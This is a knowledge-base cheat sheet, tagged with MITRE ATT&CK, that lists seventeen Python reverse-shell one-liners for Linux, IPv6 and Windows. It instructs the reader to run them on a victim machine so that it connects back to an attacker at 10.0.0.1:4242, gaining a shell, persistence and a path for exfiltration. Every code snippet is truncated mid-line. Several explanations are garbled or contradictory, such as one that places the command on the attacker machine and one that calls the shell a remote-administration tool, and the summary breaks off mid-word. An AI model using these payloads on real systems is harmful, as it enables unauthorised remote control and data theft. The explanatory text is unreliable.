---
id: eccaad25-ac8e-4cce-a752-c46b05a05200
name: Python Reverse Shell Cheat Sheet
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:24.250057+00:00'
updated_at: '2023-04-10T20:25:25.913460+00:00'
tactics:
- '[[Command and Control|TA0011 - Command and Control]]'
- '[[Defense Evasion|TA0005 - Defense Evasion]]'
- '[[Execution|TA0002 - Execution]]'
techniques:
- '[[Command-Line Interface|T1059 - Command-Line Interface]]'
- '[[Scripting|T1064 - Scripting]]'
- '[[Standard Application Layer Protocol|T1071 - Standard Application Layer Protocol]]'
sub_techniques:
- '[[Web Protocols|T1071.001 - Web Protocols]]'
- '[[Windows Command Shell|T1059.003 - Windows Command Shell]]'
tags:
- '[[Python]]'
- '[[Reverse Shell]]'
- '[[Reverse Shell Cheat Sheet]]'
---

# Python Reverse Shell Cheat Sheet

## Summary

A Python reverse shell is a type of remote access trojan (RAT) that allows an attacker to gain access to a victim's machine. This is achieved by opening a network connection from the victim's machine to the attacker's machine. The attacker can then execute commands on the victim's machine, essentia

## Description

# Description

A Python reverse shell is a type of remote access trojan (RAT) that allows an attacker to gain access to a victim's machine. This is achieved by opening a network connection from the victim's machine to the attacker's machine. The attacker can then execute commands on the victim's machine, essentially giving them full control over the system. This technique is often used by attackers to maintain persistence on a compromised system or to exfiltrate data.

The Python reverse shell works by creating a socket connection between the victim and the attacker. The attacker listens on a specified port for incoming connections, and the victim connects to that port. Once the connection is established, the attacker can execute commands on the victim's machine via the shell.

This technique can be valuable for red teaming, penetration testing, or for educational purposes.

## Requirements

1. Network access between the attacker and victim

1. Python installed on both the attacker and victim machines

1. A listener on the attacker's machine to accept incoming connections

## Defense

1. Implement network segmentation to limit access to critical systems

1. Use strong authentication mechanisms to prevent unauthorized access

1. Monitor network traffic for signs of suspicious activity

## Objectives

1. Gain remote access to a victim's machine

1. Execute commands on the victim's machine

1. Maintain persistence on a compromised system

1. Exfiltrate data from a compromised system

# Instructions

1. This command creates a reverse shell that connects to a specified IP address and port number. The shell will allow the user to execute commands on the target machine remotely.

**Code**: [[export RHOST="10.0.0.1";export RPORT=4242;python -]]

> The command requires two environment variables to be set: RHOST and RPORT. RHOST is the IP address of the machine that the shell will connect to, while RPORT is the port number that the shell will use to connect. Once the variables are set, the Python script will create a socket and connect to the specified IP address and port number. The 'os.dup2' function is used to redirect standard input, output, and error to the socket. Finally, the 'pty.spawn' function is used to spawn a new shell process with the redirected input and output.

2. To establish a reverse shell, run the following command on the target machine. Replace the IP address and port number with that of the attacker machine. Once executed, the attacker machine will have shell access to the target machine.

**Code**: [[python -c 'import socket,os,pty;s=socket.socket(so]]

> This command creates a reverse shell connection to an attacker-controlled machine by opening a socket and redirecting the standard input/output/error streams to the socket. This allows the attacker to execute commands on the target machine as if they were physically present. The 'pty.spawn("/bin/sh")' command spawns a new shell process with a pseudo-terminal (pty) allowing the attacker to interact with the shell in real-time.

3. To establish a remote shell access, execute the following command in the terminal:

**Code**: [[python -c 'import socket,subprocess,os;s=socket.so]]

> This command establishes a reverse shell connection with the IP address 10.0.0.1 on port 4242. It opens a socket connection and redirects the standard input, output, and error to the socket. The subprocess module is used to execute a shell command '/bin/sh -i' which provides an interactive shell prompt on the remote machine. This can be useful for remote administration or debugging purposes.

4. To establish a remote shell connection, run the following command in the terminal:

**Code**: [[python -c 'import socket,subprocess;s=socket.socke]]

> This command opens a TCP connection to the specified IP address and port number. Once the connection is established, it spawns a shell on the remote machine and redirects the standard input, output, and error streams to the socket. This allows the user to execute commands on the remote machine and receive the output locally. The IP address and port number should be replaced with the actual values of the remote machine.

5. Execute this command on the target machine to establish a reverse shell connection to the attacker's machine.

**Code**: [[python -c 'socket=__import__("socket");os=__import]]

> This command creates a reverse shell connection to the specified IPv4 address and port number. The command uses the Python programming language to import the necessary libraries and establish a socket connection. The 'os.dup2' function is used to duplicate the file descriptor of the socket and redirect standard input, output, and error to the socket. Finally, the 'pty.spawn' function is used to spawn a new process with a pseudo-terminal, which allows for interactive communication with the shell on the target machine.

6. To establish a reverse shell connection, run the following command on the victim machine:

**Code**: [[python -c 'socket=__import__("socket");subprocess=]]

> This command allows an attacker to remotely execute commands on a victim machine by opening a reverse shell connection. The attacker needs to have a listener running on their machine to receive the connection. The command connects to the attacker's machine at IP address 10.0.0.1 on port 4242. Once the connection is established, it redirects standard input, output, and error to the socket connection, allowing the attacker to execute commands on the victim machine. This command is often used in post-exploitation scenarios to maintain access to a compromised system.

7. Establish a remote shell connection with a target IP address and port number.

**Code**: [[python -c 'socket=__import__("socket");subprocess=]]

> This command uses Python to establish a remote shell connection with a target IP address and port number. The IP address and port number should be replaced with the actual values of the target system. Once the connection is established, this command will provide an interactive shell access to the target system, allowing the user to execute commands on the target system as if they were physically present at the target system's console.

8. Execute a reverse shell on a remote machine.

**Code**: [[python -c 'a=__import__;s=a("socket");o=a("os").du]]

> This command will open a reverse shell on a remote machine by connecting to a specified IP address and port number. The IP address should be in IPv4 format with no spaces. The command will execute a python script that connects to the specified IP address and port number, and then spawns a shell on the remote machine. This allows the user to execute commands on the remote machine as if they were sitting in front of it.

9. To use this command, you need to first open a listener on your attacker machine. Once the listener is open, execute this command on the target machine. This command will create a reverse shell connection from the target machine to your attacker machine, giving you a remote shell on the target machine.

**Code**: [[python -c 'a=__import__;b=a("socket");p=a("subproc]]

> This command uses the Python programming language to create a reverse shell connection. It first imports the necessary modules, including the socket, subprocess, and os modules. It then creates a socket object and connects to the attacker machine's IP address and port number. Once the connection is established, it uses the os.dup2() method to duplicate the file descriptors for standard input, output, and error to the socket file descriptor. Finally, it calls the /bin/sh shell with the -i option to create an interactive shell session on the target machine.

10. To establish a remote shell, execute the following command in the terminal:

**Code**: [[python -c 'a=__import__;b=a("socket");c=a("subproc]]

> This command establishes a remote shell connection to a specified IP address and port number. The Python script creates a socket object and connects to the specified IP and port. Once the connection is established, the script executes the /bin/sh shell with the -i option, which provides an interactive shell session. The stdin, stdout, and stderr file descriptors are set to the socket file descriptor to enable communication between the local and remote shells.

11. Use this command to establish a reverse shell to a remote server.

**Code**: [[python -c 'a=__import__;s=a("socket").socket;o=a("]]

> This command creates a Python script that connects to a remote server with the specified IPv4 address and port number. Once the connection is established, it spawns a pseudo-terminal and executes a shell on the remote server. This allows the user to interact with the remote server as if they were physically present on the machine. The IPv4 address should be entered without any spaces and shortened if necessary.

12. To establish a remote shell connection using Python, execute the following command:

**Code**: [[python -c 'a=__import__;b=a("socket").socket;p=a("]]

> This command uses the Python programming language to establish a remote shell connection with a target machine. The command creates a socket connection to the specified IP address and port number, and then executes a shell using the /bin/sh command. This allows the user to execute commands on the target machine as if they were physically present at the machine. The IP address and port number should be replaced with the appropriate values for the target machine.

13. To access a remote shell, run the following command in your terminal:

**Code**: [[python -c 'a=__import__;b=a("socket").socket;c=a("]]

> This command establishes a connection with a remote machine at IP address 10.0.0.1 and port 4242. It then launches a shell on the remote machine and provides you with an interactive shell session to execute commands remotely.

14. To establish a reverse shell connection over IPv6, execute the following command:

**Code**: [[python -c 'import socket,os,pty;s=socket.socket(so]]

> This command will connect to the specified IPv6 address and port using a socket connection. The standard input and output streams will be redirected to the socket connection, allowing for a shell to be spawned on the remote machine. This can be useful for gaining remote access to a target machine that is only accessible via IPv6.

15. To establish a reverse shell connection over IPv6, run this command on the target machine. Replace "dead:beef:2::125c" with your IPv6 address and "4242" with your preferred port number.

**Code**: [[python -c 'socket=__import__("socket");os=__import]]

> This command uses Python to establish a reverse shell connection over IPv6. The socket module is used to create a socket object and the os module is used to redirect standard input, output, and error to the socket. The pty module is used to spawn a pseudo-terminal for the shell. The IPv6 address and port number are specified in the s.connect() function. Once the connection is established, a shell is spawned on the attacker's machine.

16. Run this command on the attacker machine to establish a reverse shell on a target machine with an IPv6 address. Replace the IP address and port number with that of the attacker machine. After running the command, wait for the target machine to connect back to the attacker machine.

**Code**: [[python -c 'a=__import__;c=a("socket");o=a("os").du]]

> This command establishes a reverse shell on a target machine with an IPv6 address. The command creates a socket and connects to the specified IP address and port number. Once the connection is established, the command uses the dup2 function to duplicate the socket file descriptor onto standard input, output, and error. Finally, the command spawns a shell process with pty.spawn and connects it to the socket.

17. This command is used for remote command execution on a Windows operating system using Python3. It establishes a socket connection to the target machine and redirects the standard input/output of the command prompt to the socket. This allows the attacker to execute commands remotely on the target machine.

**Code**: [[python.exe -c "import socket,os,threading,subproce]]

> The command takes in no arguments. It requires the attacker to have access to a Windows machine with Python3 installed. The attacker needs to replace the IP address and port number in the code with that of the target machine. The command can be executed from the command prompt or a script.

## MITRE ATT&CK Mapping

### Tactics

- [[Command and Control|TA0011 - Command and Control]]
- [[Defense Evasion|TA0005 - Defense Evasion]]
- [[Execution|TA0002 - Execution]]

### Techniques

- [[Command-Line Interface|T1059 - Command-Line Interface]]
- [[Scripting|T1064 - Scripting]]
- [[Standard Application Layer Protocol|T1071 - Standard Application Layer Protocol]]

### Sub-Techniques

- [[Web Protocols|T1071.001 - Web Protocols]]
- [[Windows Command Shell|T1059.003 - Windows Command Shell]]

## Tags

- [[Python]]
- [[Reverse Shell]]
- [[Reverse Shell Cheat Sheet]]
